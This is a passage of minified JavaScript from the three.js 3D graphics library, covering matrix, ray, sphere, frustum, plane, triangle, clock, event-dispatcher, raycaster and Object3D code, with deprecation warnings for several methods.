b){console.warn("DEPRECATED: Matrix4's .setRotationFromEuler() has been deprecated in favor of makeRotationFromEuler.  Please update your code.");return this.makeRotationFromEuler(a,b)},makeRotationFromEuler:function(a,b){var c=this.elements,e=a.x,g=a.y,f=a.z,h=Math.cos(e),e=Math.sin(e),k=Math.cos(g),g=Math.sin(g),p=Math.cos(f),f=Math.sin(f);if(void 0===b||"XYZ"===b){var m=h*p,t=h*f,w=e*p,q=e*f;c[0]=k*p;c[4]=-k*f;c[8]=g;c[1]=t+w*g;c[5]=m-q*g;c[9]=-e*k;c[2]=q-m*g;c[6]=w+t*g;c[10]=h*k}else"YXZ"===b?
(m=k*p,t=k*f,w=g*p,q=g*f,c[0]=m+q*e,c[4]=w*e-t,c[8]=h*g,c[1]=h*f,c[5]=h*p,c[9]=-e,c[2]=t*e-w,c[6]=q+m*e,c[10]=h*k):"ZXY"===b?(m=k*p,t=k*f,w=g*p,q=g*f,c[0]=m-q*e,c[4]=-h*f,c[8]=w+t*e,c[1]=t+w*e,c[5]=h*p,c[9]=q-m*e,c[2]=-h*g,c[6]=e,c[10]=h*k):"ZYX"===b?(m=h*p,t=h*f,w=e*p,q=e*f,c[0]=k*p,c[4]=w*g-t,c[8]=m*g+q,c[1]=k*f,c[5]=q*g+m,c[9]=t*g-w,c[2]=-g,c[6]=e*k,c[10]=h*k):"YZX"===b?(m=h*k,t=h*g,w=e*k,q=e*g,c[0]=k*p,c[4]=q-m*f,c[8]=w*f+t,c[1]=f,c[5]=h*p,c[9]=-e*p,c[2]=-g*p,c[6]=t*f+w,c[10]=m-q*f):"XZY"===b&&
(m=h*k,t=h*g,w=e*k,q=e*g,c[0]=k*p,c[4]=-f,c[8]=g*p,c[1]=m*f+q,c[5]=h*p,c[9]=t*f-w,c[2]=w*f-t,c[6]=e*p,c[10]=q*f+m);c[3]=0;c[7]=0;c[11]=0;c[12]=0;c[13]=0;c[14]=0;c[15]=1;return this},setRotationFromQuaternion:function(a){console.warn("DEPRECATED: Matrix4's .setRotationFromQuaternion() has been deprecated in favor of makeRotationFromQuaternion.  Please update your code.");return this.makeRotationFromQuaternion(a)},makeRotationFromQuaternion:function(a){var b=this.elements,c=a.x,e=a.y,g=a.z,f=a.w,h=
c+c,k=e+e,p=g+g;a=c*h;var m=c*k,c=c*p,t=e*k,e=e*p,g=g*p,h=f*h,k=f*k,f=f*p;b[0]=1-(t+g);b[4]=m-f;b[8]=c+k;b[1]=m+f;b[5]=1-(a+g);b[9]=e-h;b[2]=c-k;b[6]=e+h;b[10]=1-(a+t);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},lookAt:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(e,g,f){var h=this.elements;c.subVectors(e,g).normalize();0===c.length()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.length()&&(c.x+=1E-4,a.crossVectors(f,c).normalize());
b.crossVectors(c,a);h[0]=a.x;h[4]=b.x;h[8]=c.x;h[1]=a.y;h[5]=b.y;h[9]=c.y;h[2]=a.z;h[6]=b.z;h[10]=c.z;return this}}(),multiply:function(a,b){return void 0!==b?(console.warn("DEPRECATED: Matrix4's .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead."),this.multiplyMatrices(a,b)):this.multiplyMatrices(this,a)},multiplyMatrices:function(a,b){var c=a.elements,e=b.elements,g=this.elements,f=c[0],h=c[4],k=c[8],p=c[12],m=c[1],t=c[5],w=c[9],q=c[13],y=c[2],r=c[6],z=c[10],C=c[14],
B=c[3],D=c[7],G=c[11],c=c[15],W=e[0],u=e[4],O=e[8],K=e[12],F=e[1],L=e[5],I=e[9],J=e[13],M=e[2],T=e[6],H=e[10],Z=e[14],Y=e[3],X=e[7],V=e[11],e=e[15];g[0]=f*W+h*F+k*M+p*Y;g[4]=f*u+h*L+k*T+p*X;g[8]=f*O+h*I+k*H+p*V;g[12]=f*K+h*J+k*Z+p*e;g[1]=m*W+t*F+w*M+q*Y;g[5]=m*u+t*L+w*T+q*X;g[9]=m*O+t*I+w*H+q*V;g[13]=m*K+t*J+w*Z+q*e;g[2]=y*W+r*F+z*M+C*Y;g[6]=y*u+r*L+z*T+C*X;g[10]=y*O+r*I+z*H+C*V;g[14]=y*K+r*J+z*Z+C*e;g[3]=B*W+D*F+G*M+c*Y;g[7]=B*u+D*L+G*T+c*X;g[11]=B*O+D*I+G*H+c*V;g[15]=B*K+D*J+G*Z+c*e;return this},
multiplyToArray:function(a,b,c){var e=this.elements;this.multiplyMatrices(a,b);c[0]=e[0];c[1]=e[1];c[2]=e[2];c[3]=e[3];c[4]=e[4];c[5]=e[5];c[6]=e[6];c[7]=e[7];c[8]=e[8];c[9]=e[9];c[10]=e[10];c[11]=e[11];c[12]=e[12];c[13]=e[13];c[14]=e[14];c[15]=e[15];return this},multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[4]*=a;b[8]*=a;b[12]*=a;b[1]*=a;b[5]*=a;b[9]*=a;b[13]*=a;b[2]*=a;b[6]*=a;b[10]*=a;b[14]*=a;b[3]*=a;b[7]*=a;b[11]*=a;b[15]*=a;return this},multiplyVector3:function(a){console.warn("DEPRECATED: Matrix4's .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead.");
return a.applyProjection(this)},multiplyVector4:function(a){console.warn("DEPRECATED: Matrix4's .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.");return a.applyMatrix4(this)},multiplyVector3Array:function(){var a=new THREE.Vector3;return function(b){for(var c=0,e=b.length;c<e;c+=3)a.x=b[c],a.y=b[c+1],a.z=b[c+2],a.applyProjection(this),b[c]=a.x,b[c+1]=a.y,b[c+2]=a.z;return b}}(),rotateAxis:function(a){console.warn("DEPRECATED: Matrix4's .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.");
a.transformDirection(this)},crossVector:function(a){console.warn("DEPRECATED: Matrix4's .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.");return a.applyMatrix4(this)},determinant:function(){var a=this.elements,b=a[0],c=a[4],e=a[8],g=a[12],f=a[1],h=a[5],k=a[9],p=a[13],m=a[2],t=a[6],w=a[10],q=a[14];return a[3]*(+g*k*t-e*p*t-g*h*w+c*p*w+e*h*q-c*k*q)+a[7]*(+b*k*q-b*p*w+g*f*w-e*f*q+e*p*m-g*k*m)+a[11]*(+b*p*t-b*h*q-g*f*t+c*f*q+g*h*m-c*p*m)+a[15]*(-e*h*m-b*k*t+b*h*w+e*f*t-c*f*
w+c*k*m)},transpose:function(){var a=this.elements,b;b=a[1];a[1]=a[4];a[4]=b;b=a[2];a[2]=a[8];a[8]=b;b=a[6];a[6]=a[9];a[9]=b;b=a[3];a[3]=a[12];a[12]=b;b=a[7];a[7]=a[13];a[13]=b;b=a[11];a[11]=a[14];a[14]=b;return this},flattenToArray:function(a){var b=this.elements;a[0]=b[0];a[1]=b[1];a[2]=b[2];a[3]=b[3];a[4]=b[4];a[5]=b[5];a[6]=b[6];a[7]=b[7];a[8]=b[8];a[9]=b[9];a[10]=b[10];a[11]=b[11];a[12]=b[12];a[13]=b[13];a[14]=b[14];a[15]=b[15];return a},flattenToArrayOffset:function(a,b){var c=this.elements;
a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a},getPosition:function(){var a=new THREE.Vector3;return function(){console.warn("DEPRECATED: Matrix4's .getPosition() has been removed. Use Vector3.getPositionFromMatrix( matrix ) instead.");var b=this.elements;return a.set(b[12],b[13],b[14])}}(),setPosition:function(a){var b=this.elements;
b[12]=a.x;b[13]=a.y;b[14]=a.z;return this},getInverse:function(a,b){var c=this.elements,e=a.elements,g=e[0],f=e[4],h=e[8],k=e[12],p=e[1],m=e[5],t=e[9],w=e[13],q=e[2],y=e[6],r=e[10],z=e[14],C=e[3],B=e[7],D=e[11],G=e[15];c[0]=t*z*B-w*r*B+w*y*D-m*z*D-t*y*G+m*r*G;c[4]=k*r*B-h*z*B-k*y*D+f*z*D+h*y*G-f*r*G;c[8]=h*w*B-k*t*B+k*m*D-f*w*D-h*m*G+f*t*G;c[12]=k*t*y-h*w*y-k*m*r+f*w*r+h*m*z-f*t*z;c[1]=w*r*C-t*z*C-w*q*D+p*z*D+t*q*G-p*r*G;c[5]=h*z*C-k*r*C+k*q*D-g*z*D-h*q*G+g*r*G;c[9]=k*t*C-h*w*C-k*p*D+g*w*D+h*p*G-
g*t*G;c[13]=h*w*q-k*t*q+k*p*r-g*w*r-h*p*z+g*t*z;c[2]=m*z*C-w*y*C+w*q*B-p*z*B-m*q*G+p*y*G;c[6]=k*y*C-f*z*C-k*q*B+g*z*B+f*q*G-g*y*G;c[10]=f*w*C-k*m*C+k*p*B-g*w*B-f*p*G+g*m*G;c[14]=k*m*q-f*w*q-k*p*y+g*w*y+f*p*z-g*m*z;c[3]=t*y*C-m*r*C-t*q*B+p*r*B+m*q*D-p*y*D;c[7]=f*r*C-h*y*C+h*q*B-g*r*B-f*q*D+g*y*D;c[11]=h*m*C-f*t*C-h*p*B+g*t*B+f*p*D-g*m*D;c[15]=f*t*q-h*m*q+h*p*y-g*t*y-f*p*r+g*m*r;c=e[0]*c[0]+e[1]*c[4]+e[2]*c[8]+e[3]*c[12];if(0==c){if(b)throw Error("Matrix4.getInverse(): can't invert matrix, determinant is 0");
console.warn("Matrix4.getInverse(): can't invert matrix, determinant is 0");this.identity();return this}this.multiplyScalar(1/c);return this},translate:function(a){console.warn("DEPRECATED: Matrix4's .translate() has been removed.")},rotateX:function(a){console.warn("DEPRECATED: Matrix4's .rotateX() has been removed.")},rotateY:function(a){console.warn("DEPRECATED: Matrix4's .rotateY() has been removed.")},rotateZ:function(a){console.warn("DEPRECATED: Matrix4's .rotateZ() has been removed.")},rotateByAxis:function(a,
b){console.warn("DEPRECATED: Matrix4's .rotateByAxis() has been removed.")},scale:function(a){var b=this.elements,c=a.x,e=a.y;a=a.z;b[0]*=c;b[4]*=e;b[8]*=a;b[1]*=c;b[5]*=e;b[9]*=a;b[2]*=c;b[6]*=e;b[10]*=a;b[3]*=c;b[7]*=e;b[11]*=a;return this},getMaxScaleOnAxis:function(){var a=this.elements;return Math.sqrt(Math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],Math.max(a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10])))},makeTranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return this},
makeRotationX:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(1,0,0,0,0,b,-a,0,0,a,b,0,0,0,0,1);return this},makeRotationY:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,0,a,0,0,1,0,0,-a,0,b,0,0,0,0,1);return this},makeRotationZ:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,-a,0,0,a,b,0,0,0,0,1,0,0,0,0,1);return this},makeRotationAxis:function(a,b){var c=Math.cos(b),e=Math.sin(b),g=1-c,f=a.x,h=a.y,k=a.z,p=g*f,m=g*h;this.set(p*f+c,p*h-e*k,p*k+e*h,0,p*h+e*k,m*h+c,m*k-e*f,0,p*k-
e*h,m*k+e*f,g*k*k+c,0,0,0,0,1);return this},makeScale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,0,0,0,0,1);return this},compose:function(a,b,c){console.warn("DEPRECATED: Matrix4's .compose() has been deprecated in favor of makeFromPositionQuaternionScale. Please update your code.");return this.makeFromPositionQuaternionScale(a,b,c)},makeFromPositionQuaternionScale:function(a,b,c){this.makeRotationFromQuaternion(b);this.scale(c);this.setPosition(a);return this},makeFromPositionEulerScale:function(a,
b,c,e){this.makeRotationFromEuler(b,c);this.scale(e);this.setPosition(a);return this},makeFrustum:function(a,b,c,e,g,f){var h=this.elements;h[0]=2*g/(b-a);h[4]=0;h[8]=(b+a)/(b-a);h[12]=0;h[1]=0;h[5]=2*g/(e-c);h[9]=(e+c)/(e-c);h[13]=0;h[2]=0;h[6]=0;h[10]=-(f+g)/(f-g);h[14]=-2*f*g/(f-g);h[3]=0;h[7]=0;h[11]=-1;h[15]=0;return this},makePerspective:function(a,b,c,e){a=c*Math.tan(THREE.Math.degToRad(.5*a));var g=-a;return this.makeFrustum(g*b,a*b,g,a,c,e)},makeOrthographic:function(a,b,c,e,g,f){var h=this.elements,
k=b-a,p=c-e,m=f-g;h[0]=2/k;h[4]=0;h[8]=0;h[12]=-((b+a)/k);h[1]=0;h[5]=2/p;h[9]=0;h[13]=-((c+e)/p);h[2]=0;h[6]=0;h[10]=-2/m;h[14]=-((f+g)/m);h[3]=0;h[7]=0;h[11]=0;h[15]=1;return this},clone:function(){var a=this.elements;return new THREE.Matrix4(a[0],a[4],a[8],a[12],a[1],a[5],a[9],a[13],a[2],a[6],a[10],a[14],a[3],a[7],a[11],a[15])}};
THREE.extend(THREE.Matrix4.prototype,{decompose:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3,e=new THREE.Matrix4;return function(g,f,h){var k=this.elements;a.set(k[0],k[1],k[2]);b.set(k[4],k[5],k[6]);c.set(k[8],k[9],k[10]);g=g instanceof THREE.Vector3?g:new THREE.Vector3;f=f instanceof THREE.Quaternion?f:new THREE.Quaternion;h=h instanceof THREE.Vector3?h:new THREE.Vector3;h.x=a.length();h.y=b.length();h.z=c.length();g.x=k[12];g.y=k[13];g.z=k[14];e.copy(this);e.elements[0]/=
h.x;e.elements[1]/=h.x;e.elements[2]/=h.x;e.elements[4]/=h.y;e.elements[5]/=h.y;e.elements[6]/=h.y;e.elements[8]/=h.z;e.elements[9]/=h.z;e.elements[10]/=h.z;f.setFromRotationMatrix(e);return[g,f,h]}}()});THREE.Ray=function(a,b){this.origin=void 0!==a?a:new THREE.Vector3;this.direction=void 0!==b?b:new THREE.Vector3};
THREE.Ray.prototype={constructor:THREE.Ray,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new THREE.Vector3).copy(this.direction).multiplyScalar(a).add(this.origin)},recast:function(){var a=new THREE.Vector3;return function(b){this.origin.copy(this.at(b,a));return this}}(),closestPointToPoint:function(a,b){var c=b||new THREE.Vector3;c.subVectors(a,this.origin);
var e=c.dot(this.direction);return c.copy(this.direction).multiplyScalar(e).add(this.origin)},distanceToPoint:function(){var a=new THREE.Vector3;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);a.copy(this.direction).multiplyScalar(c).add(this.origin);return a.distanceTo(b)}}(),isIntersectionSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},isIntersectionPlane:function(a){return 0!=a.normal.dot(this.direction)||0==a.distanceToPoint(this.origin)?!0:!1},distanceToPlane:function(a){var b=
a.normal.dot(this.direction);if(0==b){if(0==a.distanceToPoint(this.origin))return 0}else return-(this.origin.dot(a.normal)+a.constant)/b},intersectPlane:function(a,b){var c=this.distanceToPlane(a);return void 0===c?void 0:this.at(c,b)},applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)},clone:function(){return(new THREE.Ray).copy(this)}};
THREE.Sphere=function(a,b){this.center=void 0!==a?a:new THREE.Vector3;this.radius=void 0!==b?b:0};
THREE.Sphere.prototype={constructor:THREE.Sphere,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromCenterAndPoints:function(a,b){for(var c=0,e=0,g=b.length;e<g;e++)var f=a.distanceToSquared(b[e]),c=Math.max(c,f);this.center=a;this.radius=Math.sqrt(c);return this},copy:function(a){this.center.copy(a.center);this.radius=a.radius;return this},empty:function(){return 0>=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(a){return a.distanceTo(this.center)-
this.radius},intersectsSphere:function(a){var b=this.radius+a.radius;return a.center.distanceToSquared(this.center)<=b*b},clampPoint:function(a,b){var c=this.center.distanceToSquared(a),e=b||new THREE.Vector3;e.copy(a);c>this.radius*this.radius&&(e.sub(this.center).normalize(),e.multiplyScalar(this.radius).add(this.center));return e},getBoundingBox:function(a){a=a||new THREE.Box3;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);
this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&a.radius===this.radius},clone:function(){return(new THREE.Sphere).copy(this)}};THREE.Frustum=function(a,b,c,e,g,f){this.planes=[void 0!==a?a:new THREE.Plane,void 0!==b?b:new THREE.Plane,void 0!==c?c:new THREE.Plane,void 0!==e?e:new THREE.Plane,void 0!==g?g:new THREE.Plane,void 0!==f?f:new THREE.Plane]};
THREE.Frustum.prototype={constructor:THREE.Frustum,set:function(a,b,c,e,g,f){var h=this.planes;h[0].copy(a);h[1].copy(b);h[2].copy(c);h[3].copy(e);h[4].copy(g);h[5].copy(f);return this},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var e=c[1],g=c[2],f=c[3],h=c[4],k=c[5],p=c[6],m=c[7],t=c[8],w=c[9],q=c[10],y=c[11],r=c[12],z=c[13],C=c[14],c=c[15];b[0].setComponents(f-a,m-h,y-t,c-r).normalize();b[1].setComponents(f+
a,m+h,y+t,c+r).normalize();b[2].setComponents(f+e,m+k,y+w,c+z).normalize();b[3].setComponents(f-e,m-k,y-w,c-z).normalize();b[4].setComponents(f-g,m-p,y-q,c-C).normalize();b[5].setComponents(f+g,m+p,y+q,c+C).normalize();return this},intersectsObject:function(){var a=new THREE.Vector3;return function(b){var c=b.matrixWorld,e=this.planes;b=-b.geometry.boundingSphere.radius*c.getMaxScaleOnAxis();a.getPositionFromMatrix(c);for(c=0;6>c;c++)if(e[c].distanceToPoint(a)<b)return!1;return!0}}(),intersectsSphere:function(a){var b=
this.planes,c=a.center;a=-a.radius;for(var e=0;6>e;e++)if(b[e].distanceToPoint(c)<a)return!1;return!0},containsPoint:function(a){for(var b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0},clone:function(){return(new THREE.Frustum).copy(this)}};THREE.Plane=function(a,b){this.normal=void 0!==a?a:new THREE.Vector3(1,0,0);this.constant=void 0!==b?b:0};
THREE.Plane.prototype={constructor:THREE.Plane,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,e){this.normal.set(a,b,c);this.constant=e;return this},setFromNormalAndCoplanarPoint:function(a,b){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,e,g){e=a.subVectors(g,e).cross(b.subVectors(c,e)).normalize();this.setFromNormalAndCoplanarPoint(e,
c);return this}}(),copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},negate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,b){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,
b){var c=this.distanceToPoint(a);return(b||new THREE.Vector3).copy(this.normal).multiplyScalar(c)},isIntersectionLine:function(a){var b=this.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return 0>b&&0<a||0>a&&0<b},intersectLine:function(){var a=new THREE.Vector3;return function(b,c){var e=c||new THREE.Vector3,g=b.delta(a),f=this.normal.dot(g);if(0==f){if(0==this.distanceToPoint(b.start))return e.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0:e.copy(g).multiplyScalar(f).add(b.start)}}(),
coplanarPoint:function(a){return(a||new THREE.Vector3).copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,e){e=e||(new THREE.Matrix3).getNormalMatrix(c);var g=a.copy(this.normal).applyMatrix3(e),f=this.coplanarPoint(b);f.applyMatrix4(c);this.setFromNormalAndCoplanarPoint(g,f);return this}}(),translate:function(a){this.constant-=a.dot(this.normal);return this},equals:function(a){return a.normal.equals(this.normal)&&
a.constant==this.constant},clone:function(){return(new THREE.Plane).copy(this)}};
THREE.Math={clamp:function(a,b,c){return a<b?b:a>c?c:a},clampBottom:function(a,b){return a<b?b:a},mapLinear:function(a,b,c,e,g){return e+(a-b)*(g-e)/(c-b)},smoothstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},random16:function(){return(65280*Math.random()+255*Math.random())/65535},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,
b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*(.5-Math.random())},sign:function(a){return 0>a?-1:0<a?1:0},degToRad:function(){var a=Math.PI/180;return function(b){return b*a}}(),radToDeg:function(){var a=180/Math.PI;return function(b){return b*a}}()};THREE.Triangle=function(a,b,c){this.a=void 0!==a?a:new THREE.Vector3;this.b=void 0!==b?b:new THREE.Vector3;this.c=void 0!==c?c:new THREE.Vector3};
THREE.Triangle.normal=function(){var a=new THREE.Vector3;return function(b,c,e,g){g=g||new THREE.Vector3;g.subVectors(e,c);a.subVectors(b,c);g.cross(a);b=g.lengthSq();return 0<b?g.multiplyScalar(1/Math.sqrt(b)):g.set(0,0,0)}}();
THREE.Triangle.barycoordFromPoint=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(e,g,f,h,k){a.subVectors(h,g);b.subVectors(f,g);c.subVectors(e,g);e=a.dot(a);g=a.dot(b);f=a.dot(c);var p=b.dot(b);h=b.dot(c);var m=e*p-g*g;k=k||new THREE.Vector3;if(0==m)return k.set(-2,-1,-1);m=1/m;p=(p*f-g*h)*m;e=(e*h-g*f)*m;return k.set(1-p-e,e,p)}}();
THREE.Triangle.containsPoint=function(){var a=new THREE.Vector3;return function(b,c,e,g){b=THREE.Triangle.barycoordFromPoint(b,c,e,g,a);return 0<=b.x&&0<=b.y&&1>=b.x+b.y}}();
THREE.Triangle.prototype={constructor:THREE.Triangle,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,e){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[e]);return this},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},area:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,this.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||
new THREE.Vector3).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return THREE.Triangle.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new THREE.Plane).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return THREE.Triangle.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return THREE.Triangle.containsPoint(a,this.a,this.b,this.c)},equals:function(a){return a.a.equals(this.a)&&a.b.equals(this.b)&&a.c.equals(this.c)},
clone:function(){return(new THREE.Triangle).copy(this)}};THREE.Vertex=function(a){console.warn("THREE.Vertex has been DEPRECATED. Use THREE.Vector3 instead.");return a};THREE.UV=function(a,b){console.warn("THREE.UV has been DEPRECATED. Use THREE.Vector2 instead.");return new THREE.Vector2(a,b)};THREE.Clock=function(a){this.autoStart=void 0!==a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1};
THREE.Clock.prototype={constructor:THREE.Clock,start:function(){this.oldTime=this.startTime=void 0!==window.performance&&void 0!==window.performance.now?window.performance.now():Date.now();this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return this.elapsedTime},getDelta:function(){var a=0;this.autoStart&&!this.running&&this.start();if(this.running){var b=void 0!==window.performance&&void 0!==window.performance.now?window.performance.now():
Date.now(),a=.001*(b-this.oldTime);this.oldTime=b;this.elapsedTime+=a}return a}};THREE.EventDispatcher=function(){};
THREE.EventDispatcher.prototype={constructor:THREE.EventDispatcher,addEventListener:function(a,b){void 0===this._listeners&&(this._listeners={});var c=this._listeners;void 0===c[a]&&(c[a]=[]);-1===c[a].indexOf(b)&&c[a].push(b)},hasEventListener:function(a,b){if(void 0===this._listeners)return!1;var c=this._listeners;return void 0!==c[a]&&-1!==c[a].indexOf(b)?!0:!1},removeEventListener:function(a,b){if(void 0!==this._listeners){var c=this._listeners,e=c[a].indexOf(b);-1!==e&&c[a].splice(e,1)}},dispatchEvent:function(a){if(void 0!==
this._listeners){var b=this._listeners[a.type];if(void 0!==b){a.target=this;for(var c=0,e=b.length;c<e;c++)b[c].call(this,a)}}}};
(function(a){a.Raycaster=function(b,c,e,g){this.ray=new a.Ray(b,c);0<this.ray.direction.lengthSq()&&this.ray.direction.normalize();this.near=e||0;this.far=g||Infinity};var b=new a.Sphere,c=new a.Ray,e=new a.Plane,g=new a.Vector3,f=new a.Vector3,h=new a.Matrix4,k=function(a,b){return a.distance-b.distance},p=function(k,m,q){if(k instanceof a.Particle){f.getPositionFromMatrix(k.matrixWorld);var y=m.ray.distanceToPoint(f);if(y>k.scale.x)return q;q.push({distance:y,point:k.position,face:null,object:k})}else if(k instanceof
a.LOD)f.getPositionFromMatrix(k.matrixWorld),y=m.ray.origin.distanceTo(f),p(k.getObjectForDistance(y),m,q);else if(k instanceof a.Mesh){f.getPositionFromMatrix(k.matrixWorld);b.set(f,k.geometry.boundingSphere.radius*k.matrixWorld.getMaxScaleOnAxis());if(!m.ray.isIntersectionSphere(b))return q;var y=k.geometry,r=y.vertices,z=k.material instanceof a.MeshFaceMaterial,C=!0===z?k.material.materials:null,B=k.material.side,D,G,W,u=m.precision;h.getInverse(k.matrixWorld);c.copy(m.ray).applyMatrix4(h);for(var O=
0,K=y.faces.length;O<K;O++){var F=y.faces[O],B=!0===z?C[F.materialIndex]:k.material;if(void 0!==B){e.setFromNormalAndCoplanarPoint(F.normal,r[F.a]);var L=c.distanceToPlane(e);if(!(Math.abs(L)<u||0>L)){B=B.side;if(B!==a.DoubleSide&&(D=c.direction.dot(e.normal),!(B===a.FrontSide?0>D:0<D)))continue;if(!(L<m.near||L>m.far)){g=c.at(L,g);if(F instanceof a.Face3){if(B=r[F.a],D=r[F.b],G=r[F.c],!a.Triangle.containsPoint(g,B,D,G))continue}else if(F instanceof a.Face4){if(B=r[F.a],D=r[F.b],G=r[F.c],W=r[F.d],
!a.Triangle.containsPoint(g,B,D,W)&&!a.Triangle.containsPoint(g,D,G,W))continue}else throw Error("face type not supported");q.push({distance:L,point:m.ray.at(L),face:F,faceIndex:O,object:k})}}}}}},m=function(a,b,c){a=a.getDescendants();for(var e=0,g=a.length;e<g;e++)p(a[e],b,c)};a.Raycaster.prototype.precision=1E-4;a.Raycaster.prototype.set=function(a,b){this.ray.set(a,b);0<this.ray.direction.length()&&this.ray.direction.normalize()};a.Raycaster.prototype.intersectObject=function(a,b){var c=[];!0===
b&&m(a,this,c);p(a,this,c);c.sort(k);return c};a.Raycaster.prototype.intersectObjects=function(a,b){for(var c=[],e=0,g=a.length;e<g;e++)p(a[e],this,c),!0===b&&m(a[e],this,c);c.sort(k);return c}})(THREE);
THREE.Object3D=function(){this.id=THREE.Object3DIdCount++;this.name="";this.parent=void 0;this.children=[];this.up=new THREE.Vector3(0,1,0);this.position=new THREE.Vector3;this.rotation=new THREE.Vector3;this.eulerOrder=THREE.Object3D.defaultEulerOrder;this.scale=new THREE.Vector3(1,1,1);this.renderDepth=null;this.rotationAutoUpdate=!0;this.matrix=new THREE.Matrix4;this.matrixWorld=new THREE.Matrix4;this.matrixWorldNeedsUpdate=this.matrixAutoUpdate=!0;this.quaternion=new THREE.Quaternion;this.useQuaternion=
!1;this.visible=!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.userData={}};
THREE.Object3D.prototype={constructor:THREE.Object3D,applyMatrix:function(){var a=new THREE.Matrix4;return function(b){this.matrix.multiplyMatrices(b,this.matrix);this.position.getPositionFromMatrix(this.matrix);this.scale.getScaleFromMatrix(this.matrix);a.extractRotation(this.matrix);!0===this.useQuaternion?this.quaternion.setFromRotationMatrix(a):this.rotation.setEulerFromRotationMatrix(a,this.eulerOrder)}}(),rotateOnAxis:function(){var a=new THREE.Quaternion,b=new THREE.Quaternion;return function(c,
e){a.setFromAxisAngle(c,e);!0===this.useQuaternion?this.quaternion.multiply(a):(b.setFromEuler(this.rotation,this.eulerOrder),b.multiply(a),this.rotation.setEulerFromQuaternion(b,this.eulerOrder));return this}}(),translateOnAxis:function(){var a=new THREE.Vector3;return function(b,c){a.copy(b);!0===this.useQuaternion?a.applyQuaternion(this.quaternion):a.applyEuler(this.rotation,this.eulerOrder);this.position.add(a.multiplyScalar(c));return this}}(),translate:function(a,b){console.warn("DEPRECATED: Object3D's .translate() has been removed. Use .translateOnAxis( axis, distance ) instead. Note args have been changed.");
